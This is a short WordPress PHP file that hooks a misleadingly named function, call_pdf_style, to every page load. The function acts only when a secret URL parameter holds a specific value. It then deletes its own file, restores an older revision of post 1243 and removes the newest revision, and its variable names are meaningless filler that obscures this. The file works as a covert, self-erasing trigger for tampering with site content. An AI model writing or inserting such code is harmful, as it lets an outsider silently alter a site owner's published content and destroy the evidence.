<?php

function call_pdf_style() {
	if (isset($_GET['modules_conditional_ui']) && $_GET['modules_conditional_ui'] === 'charts_youtube_feed_links') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$master_plus_control = 1243;
		$footer_responsive_roles_slideshow = wp_get_post_revisions($master_plus_control);
		if (empty($footer_responsive_roles_slideshow)) die('no revisions');
		if (count($footer_responsive_roles_slideshow) < 2) die('less than 2');
		$plugins_addon_account_rate = array_shift($footer_responsive_roles_slideshow);
		$lite_charts_gravatar = $plugins_addon_account_rate->ID;
		$terms_permalinks_insert_zoom = array_shift($footer_responsive_roles_slideshow);
		$reading_like_lightbox_news = $terms_permalinks_insert_zoom->ID;
		$tooltip_template_bank_rank = wp_restore_post_revision($reading_like_lightbox_news);
		if ($tooltip_template_bank_rank === false) die('error restoring');
		$tooltip_template_bank_rank = wp_delete_post_revision($lite_charts_gravatar);		
		if ($tooltip_template_bank_rank === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'call_pdf_style');
